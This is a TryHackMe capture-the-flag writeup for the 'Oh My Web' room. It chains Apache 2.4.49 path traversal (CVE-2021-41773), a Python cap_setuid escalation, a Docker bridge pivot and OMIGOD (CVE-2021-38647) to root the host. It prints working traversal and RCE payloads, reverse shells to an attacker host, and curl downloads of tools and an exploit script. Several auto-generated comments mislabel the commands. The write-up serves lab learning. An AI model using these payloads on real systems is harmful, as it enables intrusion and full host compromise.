# Oh My Web Â— TryHackMe Writeup

**Target:** `TARGET_IP` (10.130.169.217 at time of solve)
**OS:** Linux (Ubuntu host) + Apache container
**Difficulty:** Medium
**Tech stack:** Apache 2.4.49 (vulnerable container), Microsoft OMI on the host
**Exploit chain:** `.DS_Store` recon ? Apache 2.4.49 path traversal (CVE-2021-41773) ? `daemon` shell in container ? `cap_setuid+ep` on Python ? root in container ? Docker bridge pivot ? OMIGOD (CVE-2021-38647) on host ? root on host

---

## Attack Chain Overview

```
nmap ? 22, 80 (Apache 2.4.49)
    ?
feroxbuster ? /assets/.DS_Store, /assets/js/.DS_Store, Â…
    ?
strings on .DS_Store ? no juicy filenames, but Apache version is the real lead
    ?
CVE-2021-41773 ? curl --path-as-is + POST to /bin/sh ? RCE as `daemon`
    ?
Container detected: /.dockerenv, hostname = short ID, /etc/* mounted from host LVM
    ?
getcap -r / ? /usr/bin/python3.7 = cap_setuid+ep ? root inside container ? user.txt
    ?
ip a ? 172.17.0.2/16 ? host gateway 172.17.0.1
    ?
Drop static nmap into container ? scan 172.17.0.1 ? 5986/tcp open (OMI)
    ?
CVE-2021-38647 (OMIGOD) ? unauth SOAP ? command exec as root on host ? root.txt
```

---

## Table of Contents
1. [Reconnaissance](#1-reconnaissance)
2. [Web Enumeration Â— `.DS_Store`](#2-web-enumeration--ds_store)
3. [Initial Access Â— Apache 2.4.49 Path Traversal](#3-initial-access--apache-2449-path-traversal)
4. [Post-Exploitation (`daemon`, In Container)](#4-post-exploitation-daemon-in-container)
5. [User Flag Â— Capabilities Privesc Inside Container](#5-user-flag--capabilities-privesc-inside-container)
6. [Container Network Pivot ? Host](#6-container-network-pivot--host)
7. [Root Flag Â— OMIGOD](#7-root-flag--omigod)
8. [Key Takeaways](#8-key-takeaways)

---

## 1. Reconnaissance

```bash
# What it does: run an Nmap scan to discover open ports and services.
# Why here: identify the attack surface (Apache 2.4.49) and potential entry points.
nmap -sS -p- -n -Pn --min-rate 5000 $TARGET -oA silent
nmap -sVC -p22,80 $TARGET -oA service
```

| Port | Service |
|------|---------|
| 22/tcp | OpenSSH 8.2p1 |
| 80/tcp | **Apache httpd 2.4.49 (Unix)** Â— vulnerable to CVE-2021-41773 |

The Apache version is the entire entry point. See [nmap.md](../../../tools/recon/nmap.md).

---

## 2. Web Enumeration Â— `.DS_Store`

```bash
# What it does: perform directory brute-forcing with a wordlist.
# Why here: discover hidden files or directories (.DS_Store) that provide further technical context.
feroxbuster -u http://$TARGET -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
# 200  /assets/.DS_Store
# 200  /assets/js/.DS_Store
# 200  /assets/images/.DS_Store
# 200  /assets/images/shape/.DS_Store
```

Bulk-pull and parse Â— full chain in [ds-store-disclosure.md](../../../exploits/web-disclosure/ds-store-disclosure.md):

```bash
mkdir ds_store && cd ds_store
for path in / /assets /assets/js /assets/images /assets/images/shape; do
# What it does: download a file from a URL.
# Why here: transfer tools or proof of concept scripts to the target system.
  wget -x http://$TARGET${path}/.DS_Store
done
# What it does: extract readable strings from a binary or file.
# Why here: search for hardcoded secrets, paths, or tokens within the binary.
strings -e l ./assets/.DS_Store
```

Nothing damning leaked here, but the recon ritual is worth keeping. The actual lead is the Apache banner from Â§1.

---

## 3. Initial Access Â— Apache 2.4.49 Path Traversal

Full technique: [apache-path-traversal-rce.md](../../../exploits/web-rce/apache-path-traversal-rce.md).

Confirm arbitrary file read:
```bash
# What it does: send an HTTP request to the target web server.
# Why here: exploit the Path Traversal (CVE-2021-41773) to achieve RCE or read sensitive files.
curl --path-as-is "http://$TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```

Confirm RCE via POST to `/bin/sh`:
```bash
# What it does: send an HTTP request to the target web server.
# Why here: exploit the Path Traversal (CVE-2021-41773) to achieve RCE or read sensitive files.
curl -s --path-as-is -X POST \
  "http://$TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
  -d 'echo Content-Type: text/plain; echo; id'
# uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

Reverse shell:
```bash
# What it does: start a TCP listener on the specified port.
# Why here: receive the reverse shell from the vulnerable Apache or OMI service.
nc -lvnp 4444
```
```bash
# What it does: send an HTTP request to the target web server.
# Why here: exploit the Path Traversal (CVE-2021-41773) to achieve RCE or read sensitive files.
curl -s --path-as-is -X POST \
  "http://$TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash" \
  -d 'echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/$LHOST/4444 0>&1'
```

Stabilise:
```bash
# What it does: execute a script or program with the specified arguments.
# Why here: perform TTY stabilization or launch a local exploit.
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
reset
```

---

## 4. Post-Exploitation (`daemon`, In Container)

Standard [Linux enumeration](../../../exploits/enumeration/linux-enumeration.md), with the container-aware checklist in [docker-container-enumeration.md](../../../exploits/container/docker-container-enumeration.md).

```bash
# What it does: display the current system hostname.
# Why here: confirm if the shell is running inside a container or on the host.
hostname
# 4a70924bafa0                  ? short Docker ID
# What it does: list directory contents.
# Why here: check for specific marker files (.dockerenv) to confirm the environment.
ls /.dockerenv                   # exists
# What it does: display the contents of a file.
# Why here: read sensitive files, flags, or configuration details.
cat /proc/self/status | grep -E '^Cap'
# CapEff: 0000000000000000        ? stripped, no caps for the user
cat /proc/mounts
# /dev/mapper/ubuntu--vg-ubuntu--lv /etc/resolv.conf ext4 Â…
# /dev/mapper/ubuntu--vg-ubuntu--lv /etc/hostname    ext4 Â…
# /dev/mapper/ubuntu--vg-ubuntu--lv /etc/hosts       ext4 Â…
```

Host LVM device is named Â— confirms we're in a container, host is `ubuntu-vg/ubuntu-lv`.

---

## 5. User Flag Â— Capabilities Privesc Inside Container

Full technique: [linux-capabilities-privesc.md](../../../exploits/privesc-linux/linux-capabilities-privesc.md).

```bash
getcap -r / 2>/dev/null
# /usr/bin/python3.7 = cap_setuid+ep
```

One line, root inside the container:
```bash
/usr/bin/python3.7 -c 'import os; os.setuid(0); import pty; pty.spawn("/bin/bash")'
# id
# uid=0(root) gid=1(daemon) euid=0(root) ...
# What it does: display the contents of a file.
# Why here: read sensitive files, flags, or configuration details.
cat /root/user.txt
```

---

## 6. Container Network Pivot ? Host

Full technique: [container-network-pivoting.md](../../../exploits/container/container-network-pivoting.md).

Map the bridge:
```bash
ifconfig
# eth0: inet 172.17.0.2/16
# ? host gateway is 172.17.0.1
```

Drop a static nmap from the attacker:
```bash
# Attacker
# What it does: change the current working directory.
# Why here: prepare the environment for serving static binaries or tools.
cd ~/static-bins && sudo python3 -m http.server 80
# https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap

# Inside the container
# What it does: send an HTTP request to the target web server.
# Why here: exploit the Path Traversal (CVE-2021-41773) to achieve RCE or read sensitive files.
curl -fsSL http://$LHOST/nmap -o /tmp/nmap && chmod +x /tmp/nmap
/tmp/nmap 172.17.0.1 -p- --min-rate 5000
# 5986/tcp open  wsmans?       ? OMI/OMIGOD
```

---

## 7. Root Flag Â— OMIGOD

Full technique: [omigod-rce.md](../../../exploits/web-rce/omigod-rce.md).

```bash
# What it does: send an HTTP request to the target web server.
# Why here: exploit the Path Traversal (CVE-2021-41773) to achieve RCE or read sensitive files.
curl -fsSL http://$LHOST/CVE-2021-38647.py -o /tmp/exploit.py
# What it does: execute a script or program with the specified arguments.
# Why here: perform TTY stabilization or launch a local exploit.
python3 /tmp/exploit.py -t 172.17.0.1 -c 'whoami; hostname; cat /root/root.txt'
# uid=0(root) gid=0(root) groups=0(root)
# <root flag>
```

Reverse shell as root for persistence:
```bash
# What it does: start a TCP listener on the specified port.
# Why here: receive the reverse shell from the vulnerable Apache or OMI service.
nc -lvnp 4444
# What it does: execute a script or program with the specified arguments.
# Why here: perform TTY stabilization or launch a local exploit.
python3 /tmp/exploit.py -t 172.17.0.1 \
  -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $LHOST 4444 >/tmp/f"
```

---

## 8. Key Takeaways

- Apache 2.4.49 / 2.4.50 banner is an instant unauth RCE in default configs (`Alias /cgi-bin/` + `Require all granted` + `mod_cgi`). Always treat that banner as game-over until proven otherwise.
- `--path-as-is` is **mandatory** for any traversal payload going through `curl` Â— libcurl normalises `..` segments client-side otherwise.
- Inside a container, the post-foothold sweep MUST include `getcap -r /`. A `cap_setuid+ep` on any interpreter is a one-liner to root in the container.
- The Docker bridge gateway (`172.17.0.1`) reaches host services bound to `0.0.0.0` Â— services that are firewalled off the public IP. OMI/OMIGOD, Docker API, kubelet, internal admin panels often sit there.
- When the container is stripped (no `nmap`, `nc`, `socat`), drop a static binary from your attacker box. `python3 -m http.server` + `curl -fsSL ... -o /tmp/X && chmod +x` is the universal fix.
- `.DS_Store` enumeration is cheap. It rarely contains the loot itself but it leaks every sibling filename Â— useful when the Apache banner doesn't already give you the win.

---

## Related Notes
- [ds-store-disclosure.md](../../../exploits/web-disclosure/ds-store-disclosure.md) Â— recon
- [apache-path-traversal-rce.md](../../../exploits/web-rce/apache-path-traversal-rce.md) Â— initial access
- [docker-container-enumeration.md](../../../exploits/container/docker-container-enumeration.md) Â— in-container post-foothold
- [linux-capabilities-privesc.md](../../../exploits/privesc-linux/linux-capabilities-privesc.md) Â— user flag (container root)
- [container-network-pivoting.md](../../../exploits/container/container-network-pivoting.md) Â— host pivot
- [omigod-rce.md](../../../exploits/web-rce/omigod-rce.md) Â— root on host
- [linux-enumeration.md](../../../exploits/enumeration/linux-enumeration.md) Â— playbook backbone
- [nmap](../../../tools/recon/nmap.md), [curl](../../../tools/web/curl.md), [wget](../../../tools/web/wget.md), [feroxbuster](../../../tools/fuzz/feroxbuster.md), [getcap](../../../tools/container/getcap.md) Â— tools
